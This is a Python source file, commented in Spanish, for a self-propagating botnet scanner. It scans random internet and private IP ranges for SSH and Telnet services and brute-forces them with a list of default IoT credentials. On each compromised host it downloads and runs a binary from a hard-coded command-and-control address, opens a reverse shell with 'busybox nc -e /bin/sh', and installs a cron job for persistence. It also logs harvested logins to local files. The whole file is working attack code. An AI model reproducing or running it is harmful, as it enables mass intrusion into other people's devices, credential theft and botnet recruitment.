import socket
import time
import random
import threading
import paramiko
import sys
import os
import json
from datetime import datetime

# =============================================
# CONFIGURACIÓN
# =============================================
CNC_IP = "172.96.140.62"
CNC_PORT = 14037  # Puerto principal CNC (Telnet/Backdoor)
CNC_DOWNLOAD_URL = "http://172.96.140.62:1283/bins/x86_64"
LOG_FILE = "login.txt"
CREDS_FILE = "credentials.json"
DEVICES_FILE = "devices.txt"

# =============================================
# CREDENCIALES SSH + TELNET
# =============================================
SSH_CREDS = [
    # === ROOT ===
    ("root", ""), ("root", "root"), ("root", "toor"), ("root", "admin"),
    ("root", "123456"), ("root", "12345678"), ("root", "123456789"),
    ("root", "password"), ("root", "pass"), ("root", "xc3511"),
    ("root", "vizxv"), ("root", "jvbzd"), ("root", "7ujMko0admin"),
    ("root", "Zte521"), ("root", "hi3518"), ("root", "j1/_7sxw"),
    ("root", "ikwb"), ("root", "dreambox"), ("root", "realtek"),
    ("root", "default"), ("root", "1111"), ("root", "1234"),
    
    # === ADMIN ===
    ("admin", ""), ("admin", "admin"), ("admin", "password"),
    ("admin", "123456"), ("admin", "12345678"), ("admin", "1234"),
    ("admin", "admin123"), ("admin", "pass"), ("admin", "password123"),
    
    # === VACÍOS ===
    ("", ""), (None, None), ("root", None), ("admin", None),
]

TELNET_CREDS = [
    # Telnet suele tener menos usuarios
    ("root", "root"), ("root", ""), ("admin", "admin"),
    ("admin", ""), ("root", "admin"), ("admin", "password"),
    ("root", "123456"), ("root", "1234"), ("", ""),
]

# =============================================
# RANGOS DE IP ACTIVOS
# =============================================
HOT_RANGES = [
    # América Latina
    ("187.0.0.0", "187.63.255.255"),  # Brasil
    ("177.0.0.0", "177.31.255.255"),  # Brasil
    ("179.0.0.0", "179.63.255.255"),  # Brasil
    ("189.0.0.0", "189.63.255.255"),  # Brasil
    ("200.0.0.0", "200.31.255.255"),  # Brasil
    ("201.0.0.0", "201.63.255.255"),  # México
    
    # Redes Privadas
    ("192.168.0.0", "192.168.255.255"),
    ("10.0.0.0", "10.255.255.255"),
    ("172.16.0.0", "172.31.255.255"),
    
    # Otras
    ("45.0.0.0", "45.63.255.255"),
    ("46.0.0.0", "46.31.255.255"),
    ("31.0.0.0", "31.31.255.255"),
]

# =============================================
# PUERTOS
# =============================================
SSH_PORTS = [22, 2222, 22222, 22223, 22224, 22225, 22226, 2200, 2201]
TELNET_PORTS = [23, 2323, 23231, 23232, 23233, 23234, 23235, 14037, 23333]

# =============================================
# CLASE TELNET CLIENT (Simple)
# =============================================
class SimpleTelnet:
    def __init__(self, timeout=5):
        self.timeout = timeout
        
    def connect(self, ip, port, username, password):
        """Conectar a servidor Telnet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((ip, port))
            
            # Leer banner
            banner = b""
            try:
                sock.settimeout(0.5)
                while True:
                    chunk = sock.recv(1024)
                    if not chunk:
                        break
                    banner += chunk
                    if b"login:" in banner.lower() or b"username:" in banner.lower():
                        break
            except:
                pass
            
            # Enviar credenciales
            if username:
                sock.send(f"{username}\n".encode())
                time.sleep(0.1)
            
            if password is not None:
                sock.send(f"{password}\n".encode())
                time.sleep(0.1)
            
            # Verificar login
            sock.settimeout(1)
            try:
                response = sock.recv(1024)
                if b"incorrect" not in response.lower() and b"fail" not in response.lower():
                    return True, sock, banner.decode('utf-8', errors='ignore')
            except:
                # Si no hay respuesta, asumimos éxito
                return True, sock, banner.decode('utf-8', errors='ignore')
            
            sock.close()
            return False, None, banner.decode('utf-8', errors='ignore')
            
        except Exception as e:
            return False, None, str(e)
    
    def execute_command(self, sock, command):
        """Ejecutar comando Telnet"""
        try:
            sock.send(f"{command}\n".encode())
            time.sleep(0.5)
            
            response = b""
            try:
                sock.settimeout(0.5)
                while True:
                    chunk = sock.recv(1024)
                    if not chunk:
                        break
                    response += chunk
            except:
                pass
            
            return response.decode('utf-8', errors='ignore')
        except:
            return ""
    
    def close(self, sock):
        """Cerrar conexión Telnet"""
        try:
            sock.close()
        except:
            pass

# =============================================
# CLASE SCANNER PRINCIPAL
# =============================================
class UniversalScanner:
    def __init__(self):
        self.running = True
        self.lock = threading.Lock()
        self.found_devices = []
        self.telnet_client = SimpleTelnet()
        
        self.stats = {
            'scanned': 0,
            'ssh_open': 0,
            'telnet_open': 0,
            'ssh_hits': 0,
            'telnet_hits': 0,
            'downloads': 0,
            'start': time.time()
        }
        
        # Inicializar archivos
        self.init_files()
        
        # Mezclar credenciales
        random.shuffle(SSH_CREDS)
        random.shuffle(TELNET_CREDS)
    
    def init_files(self):
        """Inicializar archivos de log"""
        with open(LOG_FILE, 'a') as f:
            f.write("=" * 80 + "\n")
            f.write(f"UNIVERSAL SCANNER - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"CNC: {CNC_IP}:{CNC_PORT}\n")
            f.write("=" * 80 + "\n\n")
        
        if not os.path.exists(DEVICES_FILE):
            with open(DEVICES_FILE, 'w') as f:
                f.write("# Lista de dispositivos encontrados\n")
                f.write("# Formato: IP:PORT:SERVICE:USER:PASS\n\n")
        
        if not os.path.exists(CREDS_FILE):
            with open(CREDS_FILE, 'w') as f:
                json.dump([], f)
    
    def save_credentials(self, ip, port, service, username, password, banner=""):
        """Guardar credenciales encontradas"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Entrada para login.txt
        log_entry = f"""
[+] {timestamp}
    IP: {ip}:{port}
    Service: {service}
    Credentials: {username or '(none)'}:{password or '(empty)'}
    Status: INFECTED
    Banner: {banner[:100] if banner else 'N/A'}
"""
        
        # Entrada para devices.txt
        device_entry = f"{ip}:{port}:{service}:{username or 'none'}:{password or 'empty'}"
        
        with self.lock:
            # Guardar en archivos
            with open(LOG_FILE, 'a') as f:
                f.write(log_entry)
                f.write("-" * 50 + "\n")
            
            with open(DEVICES_FILE, 'a') as f:
                f.write(device_entry + "\n")
            
            # Guardar en JSON
            try:
                with open(CREDS_FILE, 'r') as f:
                    existing = json.load(f)
            except:
                existing = []
            
            new_entry = {
                'ip': ip,
                'port': port,
                'service': service,
                'username': username,
                'password': password,
                'timestamp': timestamp,
                'banner': banner[:500] if banner else "",
                'infected': True
            }
            
            existing.append(new_entry)
            
            with open(CREDS_FILE, 'w') as f:
                json.dump(existing, f, indent=2)
            
            self.found_devices.append(new_entry)
            
            if service == "SSH":
                self.stats['ssh_hits'] += 1
            else:
                self.stats['telnet_hits'] += 1
        
        print(f"[💾] Credenciales guardadas: {ip}:{port} ({service})")
    
    def check_port(self, ip, port, timeout=1):
        """Verificar si un puerto está abierto"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            
            if result == 0:
                # Intentar leer banner
                try:
                    sock.settimeout(0.5)
                    banner = sock.recv(1024)
                    
                    # Detectar servicio
                    if b"SSH" in banner or port in SSH_PORTS:
                        return "SSH", banner
                    elif b"Telnet" in banner or b"login:" in banner.lower() or port in TELNET_PORTS:
                        return "TELNET", banner
                    else:
                        # Por el puerto determinar
                        if port in SSH_PORTS:
                            return "SSH", banner
                        elif port in TELNET_PORTS:
                            return "TELNET", banner
                        else:
                            return "UNKNOWN", banner
                            
                except:
                    # No se pudo leer banner, determinar por puerto
                    if port in SSH_PORTS:
                        return "SSH", b''
                    elif port in TELNET_PORTS:
                        return "TELNET", b''
                    else:
                        return "UNKNOWN", b''
            
            sock.close()
            return None, b''
            
        except:
            return None, b''
    
    def infect_ssh(self, ip, port, username, password):
        """Infectar dispositivo SSH"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                ip, port,
                username=username or '',
                password=password or '',
                timeout=5,
                look_for_keys=False,
                allow_agent=False
            )
            
            print(f"[✅] SSH conectado: {ip}:{port}")
            
            # Comandos de infección
            commands = [
                # Descargar binario
                f"cd /tmp && wget -q {CNC_DOWNLOAD_URL} -O .x && chmod +x .x",
                f"cd /tmp && curl -s {CNC_DOWNLOAD_URL} -o .x && chmod +x .x",
                
                # Conectar al CNC (Telnet en puerto 14037)
                f"cd /tmp && [ -f .x ] && ./.x {CNC_IP} {CNC_PORT} &",
                f"busybox nc {CNC_IP} {CNC_PORT} -e /bin/sh &",
                
                # Persistencia
                "echo '* * * * * cd /tmp && [ -f .x ] && ./.x' > /tmp/cronjob",
                "crontab /tmp/cronjob 2>/dev/null",
            ]
            
            for cmd in commands:
                try:
                    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=2)
                    stdout.read()
                    time.sleep(0.1)
                except:
                    continue
            
            ssh.close()
            
            with self.lock:
                self.stats['downloads'] += 1
            
            return True
            
        except Exception as e:
            print(f"[❌] Error SSH: {e}")
            return False
    
    def infect_telnet(self, ip, port, username, password):
        """Infectar dispositivo Telnet"""
        try:
            success, sock, banner = self.telnet_client.connect(ip, port, username, password)
            
            if success:
                print(f"[✅] Telnet conectado: {ip}:{port}")
                
                # Comandos para infección
                commands = [
                    # Descargar binario
                    f"cd /tmp && wget {CNC_DOWNLOAD_URL} -O .x",
                    f"chmod +x /tmp/.x",
                    
                    # Conectar al CNC
                    f"/tmp/.x {CNC_IP} {CNC_PORT}",
                    f"busybox nc {CNC_IP} {CNC_PORT} -e /bin/sh",
                    
                    # Si wget no funciona, intentar con curl
                    f"cd /tmp && curl {CNC_DOWNLOAD_URL} -o .x",
                    
                    # Método directo (si telnet acepta comandos)
                    f"echo 'cd /tmp; wget {CNC_DOWNLOAD_URL} -O .x; chmod +x .x; ./.x {CNC_IP} {CNC_PORT}' | at now",
                ]
                
                for cmd in commands:
                    self.telnet_client.execute_command(sock, cmd)
                    time.sleep(0.3)
                
                # También intentar conectar directamente desde aquí
                try:
                    direct_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    direct_sock.settimeout(3)
                    direct_sock.connect((CNC_IP, CNC_PORT))
                    direct_sock.send(f"CONNECT {ip}:{port}\n".encode())
                    direct_sock.close()
                except:
                    pass
                
                self.telnet_client.close(sock)
                
                with self.lock:
                    self.stats['downloads'] += 1
                
                return True
            else:
                return False
                
        except Exception as e:
            print(f"[❌] Error Telnet: {e}")
            return False
    
    def brute_service(self, ip, port, service, banner):
        """Brute force al servicio detectado"""
        if service == "SSH":
            creds_list = SSH_CREDS[:50]  # Solo probar 50
        else:
            creds_list = TELNET_CREDS[:30]
        
        for username, password in creds_list:
            if not self.running:
                return False
            
            print(f"[🎯] Probando {service}: {ip}:{port} - {username}:{password}")
            
            success = False
            if service == "SSH":
                success = self.infect_ssh(ip, port, username, password)
            else:
                success = self.infect_telnet(ip, port, username, password)
            
            if success:
                banner_str = banner.decode('utf-8', errors='ignore') if isinstance(banner, bytes) else banner
                self.save_credentials(ip, port, service, username, password, banner_str)
                return True
        
        return False
    
    def worker(self, worker_id):
        """Worker principal"""
        print(f"[Thread {worker_id}] Iniciado")
        
        while self.running:
            try:
                # Generar IP aleatoria
                start_range, end_range = random.choice(HOT_RANGES)
                start = list(map(int, start_range.split('.')))
                end = list(map(int, end_range.split('.')))
                
                ip_parts = []
                for i in range(4):
                    ip_parts.append(str(random.randint(start[i], end[i])))
                ip = ".".join(ip_parts)
                
                # Probar puertos SSH
                for port in SSH_PORTS:
                    if not self.running:
                        return
                    
                    service, banner = self.check_port(ip, port, timeout=0.5)
                    
                    if service == "SSH":
                        with self.lock:
                            self.stats['ssh_open'] += 1
                        
                        print(f"[Thread {worker_id}] SSH en {ip}:{port}")
                        self.brute_service(ip, port, "SSH", banner)
                        break  # Solo un puerto por IP
                
                # Probar puertos Telnet
                for port in TELNET_PORTS:
                    if not self.running:
                        return
                    
                    service, banner = self.check_port(ip, port, timeout=0.5)
                    
                    if service == "TELNET":
                        with self.lock:
                            self.stats['telnet_open'] += 1
                        
                        print(f"[Thread {worker_id}] Telnet en {ip}:{port}")
                        self.brute_service(ip, port, "TELNET", banner)
                        break  # Solo un puerto por IP
                
                with self.lock:
                    self.stats['scanned'] += 1
                
                # Estadísticas cada 50 IPs
                if self.stats['scanned'] % 50 == 0:
                    self.show_stats()
                    
                # Pequeña pausa para no saturar
                time.sleep(0.01)
                    
            except Exception as e:
                continue
    
    def show_stats(self):
        """Mostrar estadísticas"""
        elapsed = time.time() - self.stats['start']
        
        with self.lock:
            scanned = self.stats['scanned']
            ssh_open = self.stats['ssh_open']
            telnet_open = self.stats['telnet_open']
            ssh_hits = self.stats['ssh_hits']
            telnet_hits = self.stats['telnet_hits']
            downloads = self.stats['downloads']
        
        print(f"\n{'='*60}")
        print(f"[📊] ESTADÍSTICAS")
        print(f"{'='*60}")
        print(f"[⏱️] Tiempo: {elapsed:.0f}s")
        print(f"[🔍] IPs escaneadas: {scanned:,}")
        print(f"[🔓] SSH abiertos: {ssh_open}")
        print(f"[🔌] Telnet abiertos: {telnet_open}")
        print(f"[🎯] SSH infectados: {ssh_hits}")
        print(f"[🎯] Telnet infectados: {telnet_hits}")
        print(f"[⬇️] Descargas totales: {downloads}")
        print(f"[🎲] Hilos activos: {threading.active_count()}")
        print(f"[🔗] CNC: {CNC_IP}:{CNC_PORT}")
        print(f"{'='*60}")
    
    def start_scan(self, threads=100):
        """Iniciar escaneo"""
        print(f"""
╔══════════════════════════════════════════════╗
║      UNIVERSAL SCANNER v2.0                  ║
║      ======================                  ║
║   🔥  Soporte SSH + Telnet                   ║
║   ⚡  {threads} Hilos                        ║
║   🎯  Auto-conexión al CNC                   ║
║   💾  Guarda credenciales                    ║
║   🔗  CNC: {CNC_IP}:{CNC_PORT:<15}         ║
╚══════════════════════════════════════════════╝

[📡] CNC Server: {CNC_IP}:{CNC_PORT}
[⬇️] Download URL: {CNC_DOWNLOAD_URL}
[🔥] Credenciales SSH: {len(SSH_CREDS)} combos
[🔥] Credenciales Telnet: {len(TELNET_CREDS)} combos
[⚡] Hilos: {threads}
[💾] Archivos de salida:")
[   ] {LOG_FILE}")
[   ] {DEVICES_FILE}")
[   ] {CREDS_FILE}")
[🎯] Iniciando en 3 segundos...""")
        
        time.sleep(3)
        
        # Iniciar workers
        worker_threads = []
        for i in range(threads):
            t = threading.Thread(target=self.worker, args=(i+1,), daemon=True)
            t.start()
            worker_threads.append(t)
            time.sleep(0.01)
        
        print(f"\n[✅] {len(worker_threads)} workers iniciados!")
        print("[📊] Estadísticas cada 50 IPs")
        print("[🔥] ESCANEANDO DISPOSITIVOS SSH/TELNET...\n")
        
        # Loop principal
        try:
            while True:
                time.sleep(10)
                self.show_stats()
                
        except KeyboardInterrupt:
            print("\n[!] Deteniendo scanner...")
            self.running = False
            
            for t in worker_threads:
                t.join(timeout=1)
            
            self.show_final_stats()
    
    def show_final_stats(self):
        """Mostrar estadísticas finales"""
        print(f"\n{'='*60}")
        print(f"[🏁] ESTADÍSTICAS FINALES")
        print(f"{'='*60}")
        
        elapsed = time.time() - self.stats['start']
        hours = elapsed // 3600
        minutes = (elapsed % 3600) // 60
        seconds = elapsed % 60
        
        print(f"[⏱️] Tiempo total: {int(hours)}h {int(minutes)}m {int(seconds)}s")
        print(f"[🔍] IPs escaneadas: {self.stats['scanned']:,}")
        print(f"[🔓] Servidores SSH encontrados: {self.stats['ssh_open']}")
        print(f"[🔌] Servidores Telnet encontrados: {self.stats['telnet_open']}")
        print(f"[🎯] SSH infectados: {self.stats['ssh_hits']}")
        print(f"[🎯] Telnet infectados: {self.stats['telnet_hits']}")
        print(f"[⬇️] Binarios descargados: {self.stats['downloads']}")
        
        # Mostrar últimos dispositivos
        if self.found_devices:
            print(f"\n[📋] ÚLTIMOS 5 DISPOSITIVOS:")
            for i, dev in enumerate(self.found_devices[-5:], 1):
                print(f"{i}. {dev['ip']}:{dev['port']} ({dev['service']}) - {dev['username']}:{dev['password']}")
        
        print(f"{'='*60}")

# =============================================
# HERRAMIENTAS MANUALES
# =============================================
class ManualTools:
    @staticmethod
    def list_devices():
        """Listar dispositivos encontrados"""
        if not os.path.exists(DEVICES_FILE):
            print("[!] No se encontraron dispositivos")
            return
        
        print(f"\n{'='*60}")
        print(f"[📋] DISPOSITIVOS ENCONTRADOS")
        print(f"{'='*60}")
        
        with open(DEVICES_FILE, 'r') as f:
            devices = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        if not devices:
            print("[!] No hay dispositivos en el archivo")
            return
        
        for i, dev in enumerate(devices, 1):
            parts = dev.split(':')
            if len(parts) >= 5:
                print(f"{i:3}. {parts[0]}:{parts[1]} ({parts[2]})")
                print(f"     User: {parts[3]} | Pass: {parts[4]}")
                print()
    
    @staticmethod
    def connect_cnc():
        """Conectar directamente al CNC"""
        print(f"\n[🔌] Conectando al CNC {CNC_IP}:{CNC_PORT}...")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((CNC_IP, CNC_PORT))
            
            print("[✅] Conectado al CNC!")
            print("[💻] Conexión Telnet/Backdoor establecida")
            
            # Leer banner
            try:
                sock.settimeout(1)
                banner = sock.recv(1024)
                if banner:
                    print(f"[📢] Banner: {banner.decode('utf-8', errors='ignore')}")
            except:
                pass
            
            sock.close()
            
        except Exception as e:
            print(f"[❌] Error conectando al CNC: {e}")
    
    @staticmethod
    def manual_infect():
        """Infección manual de dispositivo"""
        print(f"\n{'='*60}")
        print(f"[🦠] INFECCIÓN MANUAL")
        print(f"{'='*60}")
        
        ip = input("IP: ").strip()
        port = input("Puerto [22]: ").strip() or "22"
        service = input("Servicio (SSH/Telnet): ").strip().upper()
        username = input("Usuario [root]: ").strip() or "root"
        password = input("Contraseña [opcional]: ").strip()
        
        scanner = UniversalScanner()
        
        if service == "SSH":
            success = scanner.infect_ssh(ip, int(port), username, password)
        elif service == "TELNET":
            success = scanner.infect_telnet(ip, int(port), username, password)
        else:
            print("[!] Servicio no válido")
            return
        
        if success:
            print("[✅] Infección exitosa!")
        else:
            print("[❌] Infección fallida")

# =============================================
# MENÚ PRINCIPAL
# =============================================
def main_menu():
    """Menú principal"""
    os.system('clear' if os.name == 'posix' else 'cls')
    
    while True:
        print(f"""
╔══════════════════════════════════════════════╗
║      UNIVERSAL SCANNER v2.0                  ║
║      ======================                  ║
║   1. 🔍 Iniciar Scanner Universal            ║
║   2. 📋 Listar Dispositivos Encontrados      ║
║   3. 🔌 Conectar al CNC Manualmente          ║
║   4. 🦠 Infección Manual                     ║
║   5. 📊 Ver Estadísticas                     ║
║   6. 🧪 Probar Conexión Individual           ║
║   7. 🚪 Salir                                ║
║                                              ║
║   CNC: {CNC_IP}:{CNC_PORT:<15}             ║
║   URL: {CNC_DOWNLOAD_URL:<30}║
╚══════════════════════════════════════════════╝
""")
        
        choice = input("[?] Opción (1-7): ").strip()
        
        if choice == "1":
            # Iniciar scanner
            try:
                threads = input("[?] Número de hilos [100]: ").strip()
                threads = int(threads) if threads else 100
                
                scanner = UniversalScanner()
                scanner.start_scan(threads)
                
            except KeyboardInterrupt:
                print("\n[!] Scanner detenido")
            except Exception as e:
                print(f"\n[❌] Error: {e}")
                input("\nEnter para continuar...")
        
        elif choice == "2":
            # Listar dispositivos
            ManualTools.list_devices()
            input("\nEnter para continuar...")
        
        elif choice == "3":
            # Conectar al CNC
            ManualTools.connect_cnc()
            input("\nEnter para continuar...")
        
        elif choice == "4":
            # Infección manual
            ManualTools.manual_infect()
            input("\nEnter para continuar...")
        
        elif choice == "5":
            # Ver estadísticas
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'r') as f:
                    lines = f.readlines()
                    devices = sum(1 for line in lines if "IP:" in line)
                    ssh_count = sum(1 for line in lines if "Service: SSH" in line)
                    telnet_count = sum(1 for line in lines if "Service: TELNET" in line)
                    
                    print(f"\n[📊] ESTADÍSTICAS:")
                    print(f"[📋] Dispositivos totales: {devices}")
                    print(f"[🔓] SSH: {ssh_count}")
                    print(f"[🔌] Telnet: {telnet_count}")
                    
                    # Últimos 3
                    print(f"\n[🕒] Últimos 3 dispositivos:")
                    recent = []
                    current = []
                    for line in reversed(lines[-100:]):
                        if "IP:" in line:
                            if current:
                                recent.append("".join(reversed(current)))
                                if len(recent) >= 3:
                                    break
                            current = [line]
                        elif current and line.strip():
                            current.append(line)
                    
                    for i, device in enumerate(reversed(recent), 1):
                        print(f"\n{i}. {device.strip()}")
            else:
                print("[!] No hay datos aún")
            
            input("\nEnter para continuar...")
        
        elif choice == "6":
            # Probar conexión individual
            print("\n[🧪] Probar Conexión")
            ip = input("IP: ").strip()
            port = input("Puerto [22]: ").strip() or "22"
            
            scanner = UniversalScanner()
            service, banner = scanner.check_port(ip, int(port), timeout=3)
            
            if service:
                print(f"[✅] Servicio detectado: {service}")
                if banner:
                    print(f"[📢] Banner: {banner[:200]}")
            else:
                print("[❌] Puerto cerrado o sin servicio")
            
            input("\nEnter para continuar...")
        
        elif choice == "7":
            print("\n[👋] Saliendo...")
            break
        
        else:
            print("\n[!] Opción inválida")
            time.sleep(1)
        
        os.system('clear' if os.name == 'posix' else 'cls')

# =============================================
# EJECUCIÓN
# =============================================
if __name__ == "__main__":
    # Verificar dependencias
    try:
        import paramiko
    except ImportError:
        print("[!] Instalar paramiko: pip install paramiko")
        sys.exit(1)
    
    # Verificar conexión al CNC primero
    print("[🔍] Verificando CNC...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((CNC_IP, CNC_PORT))
        sock.close()
        
        if result == 0:
            print(f"[✅] CNC {CNC_IP}:{CNC_PORT} está activo")
        else:
            print(f"[⚠️] CNC {CNC_IP}:{CNC_PORT} no responde")
            respuesta = input("¿Continuar de todos modos? (s/N): ").lower()
            if respuesta != 's':
                sys.exit(1)
    except:
        print(f"[⚠️] No se pudo verificar CNC")
    
    # Ejecutar menú
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\n\n[👋] Programa terminado")
    except Exception as e:
        print(f"\n[❌] Error: {e}")
        import traceback
        traceback.print_exc()
